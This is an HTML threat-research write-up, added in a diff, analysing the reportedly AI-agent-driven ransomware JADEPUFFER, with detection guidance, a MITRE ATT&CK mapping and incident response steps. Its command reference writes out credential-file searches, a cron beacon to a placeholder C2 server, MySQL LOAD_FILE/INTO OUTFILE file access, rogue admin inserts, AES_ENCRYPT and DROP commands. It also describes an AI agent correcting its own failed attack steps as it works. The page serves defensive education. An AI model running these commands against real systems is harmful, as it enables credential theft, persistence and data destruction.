+<p>Treat the following sequence as highly suspicious in production:</p>
+<pre><code class="language-text">FOREIGN_KEY_CHECKS=0
+        ↓
+DROP TABLE or DROP DATABASE
+        ↓
+FOREIGN_KEY_CHECKS=1</code></pre>
+<hr>
+<h1 id="command-reference">💻 Command Reference</h1>
+<h2 id="linux-and-host-commands">Linux and Host Commands</h2>
+<div class='table-wrap'><table><thead><tr><th>Command</th><th>Purpose</th><th>Defensive context</th></tr></thead><tbody><tr><td><code>id</code></td><td>Identify current user and group privileges</td><td>Suspicious when launched by an internet-facing application</td></tr><tr><td><code>uname -a</code></td><td>Display OS and kernel information</td><td>Common post-compromise reconnaissance</td></tr><tr><td><code>hostname</code></td><td>Display host name</td><td>Helps map the environment</td></tr><tr><td><code>find / -name ".env" 2&gt;/dev/null</code></td><td>Search for environment files</td><td>Investigate when run by service accounts</td></tr><tr><td><code>find / -name "credentials.json" 2&gt;/dev/null</code></td><td>Search for credential files</td><td>High-value secret discovery behavior</td></tr></tbody></table></div>
+<h2 id="persistence-command">Persistence Command</h2>
+<pre><code class="language-bash">*/30 * * * * python3 -c &quot;contact(&#x27;[C2-SERVER]/beacon&#x27;)&quot;</code></pre>
+<div class='table-wrap'><table><thead><tr><th>Component</th><th>Meaning</th></tr></thead><tbody><tr><td><code>*/30</code></td><td>Run every 30 minutes</td></tr><tr><td><code>python3 -c</code></td><td>Execute inline Python</td></tr><tr><td><code>[C2-SERVER]</code></td><td>Sanitized attacker-controlled endpoint</td></tr></tbody></table></div>
+<h2 id="mysql-file-access-commands">MySQL File-Access Commands</h2>
+<pre><code class="language-sql">SELECT LOAD_FILE(&#x27;/var/run/docker.sock&#x27;);
+SELECT LOAD_FILE(&#x27;/proc/1/cgroup&#x27;);
+SELECT LOAD_FILE(&#x27;/etc/hostname&#x27;);</code></pre>
+<p>These commands test whether the database can read sensitive local files.</p>
+<h2 id="mysql-file-write-test">MySQL File-Write Test</h2>
+<pre><code class="language-sql">SELECT &#x27;test&#x27;
+INTO OUTFILE &#x27;/var/lib/mysql-files/[TEST-FILE]&#x27;;</code></pre>
+<p>This tests whether MySQL can write files to the host filesystem.</p>
+<h2 id="account-manipulation-commands">Account Manipulation Commands</h2>
+<pre><code class="language-sql">INSERT INTO users (...);
+INSERT INTO roles (...);
+DELETE FROM users WHERE username=&#x27;[NEW-ADMIN]&#x27;;
+DELETE FROM roles WHERE username=&#x27;[NEW-ADMIN]&#x27;;</code></pre>
+<p>These statements create, assign privileges to, or remove an account directly through the database.</p>
+<h2 id="encryption-commands">Encryption Commands</h2>
+<pre><code class="language-sql">AES_ENCRYPT(content, &#x27;[RANDOM-KEY]&#x27;)
+TO_BASE64(...)</code></pre>
+<p>These functions encrypt database content and convert the result into text.</p>
+<h2 id="destructive-commands">Destructive Commands</h2>
+<pre><code class="language-sql">DROP TABLE [TABLE-NAME];
+DROP DATABASE [DATABASE-NAME];
+SET GLOBAL FOREIGN_KEY_CHECKS=0;</code></pre>
+<p>These commands can remove production data or bypass relationship checks that would otherwise prevent deletion.</p>
+<hr>
+<h1 id="what-made-jadepuffer-different">🤖 What Made JADEPUFFER Different</h1>
+<div class='table-wrap'><table><thead><tr><th>Capability</th><th>Evidence</th></tr></thead><tbody><tr><td><strong>Environment awareness</strong></td><td>Performed system, network, storage and database discovery</td></tr><tr><td><strong>Target prioritization</strong></td><td>Focused on credentials, Terraform state, backups and production configuration</td></tr><tr><td><strong>Self-correction</strong></td><td>Modified an XML/JSON parser after an unexpected response</td></tr><tr><td><strong>Authentication troubleshooting</strong></td><td>Corrected a failed Nacos password-hash implementation</td></tr><tr><td><strong>Database error handling</strong></td><td>Changed SQL behavior after a foreign-key failure</td></tr><tr><td><strong>End-to-end chaining</strong></td><td>Connected initial access, discovery, persistence, lateral movement and impact</td></tr></tbody></table></div>
+<pre><code class="language-mermaid">flowchart TD
+    A[Command Fails] --&gt; B[Observe Error]
+    B --&gt; C[Interpret Cause]
+    C --&gt; D[Modify Command or Code]
+    D --&gt; E[Retry]
+    E --&gt; F{Successful?}
+    F -- Yes --&gt; G[Continue Attack]
+    F -- No --&gt; B</code></pre>
+<hr>
+<h1 id="detection-opportunities">🔍 Detection Opportunities</h1>
+<h2 id="host-and-process-monitoring">Host and Process Monitoring</h2>
+<ul>
+<li>- Unexpected Python execution from Langflow or similar AI applications</li>
+<li>- Shell commands spawned by web-facing services</li>
+<li>- Searches for <code>.env</code>, <code>credentials.json</code> and cloud configuration files</li>
+<li>- Access to <code>/var/run/docker.sock</code> or <code>/proc/1/cgroup</code></li>
+<li>- New cron jobs created by application accounts</li>
+</ul>
+<h2 id="network-monitoring">Network Monitoring</h2>
+<ul>
+<li>- AI application servers connecting to internal MinIO</li>
+<li>- Application servers initiating administrative MySQL sessions</li>
+<li>- Recurring outbound beaconing every 30 minutes</li>
+<li>- Access to database ports from previously unseen sources</li>
+</ul>
+<h2 id="database-monitoring">Database Monitoring</h2>
+<ul>
+<li>- Direct inserts into authentication or role tables</li>
+<li>- <code>LOAD_FILE()</code> calls against operating-system paths</li>
+<li>- <code>INTO OUTFILE</code> usage</li>
+<li>- Large-scale <code>AES_ENCRYPT()</code> activity</li>
+<li>- <code>DROP TABLE</code> or <code>DROP DATABASE</code></li>
+<li>- <code>FOREIGN_KEY_CHECKS=0</code> before destructive actions</li>
+<li>- Creation of <code>README_RANSOM</code> or similarly named tables</li>
+</ul>
+<hr>
+<h2 id="high-confidence-detection-sequence">🚨 High-Confidence Detection Sequence</h2>
+<pre><code class="language-mermaid">flowchart LR
+    A[Unexpected Python from Langflow]
+    --&gt; B[Credential File Search]
+    --&gt; C[Internal Storage Enumeration]
+    --&gt; D[New Cron Job]
+    --&gt; E[Admin MySQL Connection]
+    --&gt; F[AES_ENCRYPT at Scale]
+    --&gt; G[DROP TABLE or DATABASE]</code></pre>
+<p>A single command may be legitimate. A sequence like the above should be treated as a high-priority incident.</p>
+<hr>
+<h1 id="mitre-att-ck-mapping">🧭 MITRE ATT&amp;CK Mapping</h1>
+<div class='table-wrap'><table><thead><tr><th>Tactic</th><th>Technique</th><th>ID</th></tr></thead><tbody><tr><td>Initial Access</td><td>Exploit Public-Facing Application</td><td>T1190</td></tr><tr><td>Execution</td><td>Command and Scripting Interpreter: Python</td><td>T1059.006</td></tr><tr><td>Discovery</td><td>System Information Discovery</td><td>T1082</td></tr><tr><td>Discovery</td><td>Network Service Discovery</td><td>T1046</td></tr><tr><td>Credential Access</td><td>Unsecured Credentials: Credentials in Files</td><td>T1552.001</td></tr><tr><td>Collection</td><td>Data from Local System</td><td>T1005</td></tr><tr><td>Persistence</td><td>Scheduled Task/Job: Cron</td><td>T1053.003</td></tr><tr><td>Command and Control</td><td>Application Layer Protocol</td><td>T1071</td></tr><tr><td>Lateral Movement</td><td>Valid Accounts</td><td>T1078</td></tr><tr><td>Lateral Movement</td><td>Exploitation of Remote Services</td><td>T1210</td></tr><tr><td>Persistence / Privilege</td><td>Create Account</td><td>T1136</td></tr><tr><td>Discovery</td><td>Container and Resource Discovery</td><td>T1613</td></tr><tr><td>Impact</td><td>Data Encrypted for Impact</td><td>T1486</td></tr><tr><td>Impact</td><td>Data Destruction</td><td>T1485</td></tr></tbody></table></div>
+<hr>
+<h1 id="incident-response-priorities">🧯 Incident Response Priorities</h1>
+<h2 id="immediate-containment">Immediate containment</h2>
+<ol>
+<li>1. Isolate the affected Langflow host.</li>
+<li>2. Block attacker-controlled destinations.</li>
+<li>3. Disable newly created accounts.</li>
+<li>4. Restrict database access to approved management hosts.</li>
+<li>5. Suspend suspicious cron jobs.</li>
+<li>6. Rotate cloud, API, database and LLM-provider credentials.</li>
+</ol>
+<h2 id="investigation">Investigation</h2>
+<ol>
+<li>1. Review Langflow application and web logs.</li>
+<li>2. Identify unexpected Python execution.</li>
+<li>3. Examine shell history and process telemetry.</li>
+<li>4. Inspect PostgreSQL and MySQL audit logs.</li>
+<li>5. Review MinIO access logs and bucket activity.</li>
+<li>6. Search for newly created database users and roles.</li>
+<li>7. Identify <code>LOAD_FILE</code>, <code>INTO OUTFILE</code>, <code>AES_ENCRYPT</code>, <code>DROP TABLE</code> and <code>DROP DATABASE</code> activity.</li>
+<li>8. Verify whether backups are intact and isolated.</li>
+</ol>
+<h2 id="recovery">Recovery</h2>
+<ol>
+<li>1. Rebuild compromised internet-facing systems.</li>
+<li>2. Restore databases from verified clean backups.</li>
+<li>3. Validate configuration integrity.</li>
+<li>4. Rotate all exposed secrets.</li>
+<li>5. Patch Langflow and other vulnerable components.</li>
+<li>6. Implement stronger segmentation and least privilege.</li>
+</ol>
+<hr>
+<h1 id="lessons-learned">📚 Lessons Learned</h1>
+<div class="callout tip"><strong>Tip</strong><p>The strongest detection opportunity is not one command—it is the behavioral sequence across the attack chain.</p></div>
+<ul>
+<li>- Treat AI infrastructure as a production attack surface.</li>
+<li>- Do not store long-lived secrets in plaintext configuration files.</li>
+<li>- Limit application-server access to production databases.</li>
+<li>- Monitor administrative database actions.</li>
+<li>- Alert on unexpected use of native database encryption functions.</li>
+<li>- Use immutable and offline backups.</li>
+<li>- Build detections that correlate activity across host, network, identity and database telemetry.</li>
+<li>- Assume future automated attacks may adapt faster than traditional playbooks expect.</li>
+</ul>
+<hr>
+<h1 id="analyst-conclusion">👨‍💻 Analyst Conclusion</h1>
+<p>JADEPUFFER demonstrates how established offensive techniques can become more dangerous when an AI agent selects, tests and corrects actions autonomously.</p>
+<p>The reconnaissance commands were simple. The SQL statements were familiar. Cron persistence was not new. What changed was the workflow: failed actions did not necessarily stop the intrusion. The agent reportedly interpreted errors, revised its approach and continued toward destructive impact.</p>
+<p>For SOC, DFIR and threat-hunting teams, the case reinforces three priorities:</p>
+<ol>
+<li>1. <strong>Detect behavior and sequences, not only known payloads.</strong></li>
+<li>2. <strong>Secure AI platforms and their credentials as critical infrastructure.</strong></li>
+<li>3. <strong>Reduce the time between detection and containment.</strong></li>
+</ol>
+<div class="callout important"><strong>Important</strong><p>An adversary operating at machine speed can compress an intrusion that once took hours into minutes. Detection engineering and automated containment must evolve accordingly.</p></div>
+<hr>
+<h1 id="reference">🔗 Reference</h1>
+<p><strong>Primary research:</strong> Sysdig Threat Research Team — <em>JADEPUFFER: Agentic Ransomware for Automated Database Extortion</em></p>
+<p><strong>Original article:</strong>  </p>
+<p>https://www.sysdig.com/blog/jadepuffer-agentic-ransomware-for-automated-database-extortion</p>
+<hr>
+<h2 id="disclaimer">⚖️ Disclaimer</h2>
+<p>This write-up is an independent restructuring and analysis of publicly reported findings. It is intended for:</p>
+<ul>
+<li>- Cybersecurity education</li>
+<li>- Threat research</li>
+<li>- Defensive detection engineering</li>
+<li>- SOC and DFIR training</li>
+<li>- Portfolio demonstration</li>
+</ul>
+<p>All commands should be used only in systems and labs where you have explicit authorization.</p>
+<hr>
+<p>⭐ <strong>Found this analysis useful? Consider starring the repository and sharing your feedback.</strong></p>
+  </article>
+</div>
+
+<footer>© 2026 Gopichand Murari · Threat Research Portfolio</footer>
+
+<script>
+  window.addEventListener('scroll', () => {
+    const doc = document.documentElement;
+    const pct = (doc.scrollTop / (doc.scrollHeight - doc.clientHeight)) * 100;
+    document.getElementById('progress').style.width = pct + '%';
+  });
+</script>
+</body>
+</html>
 
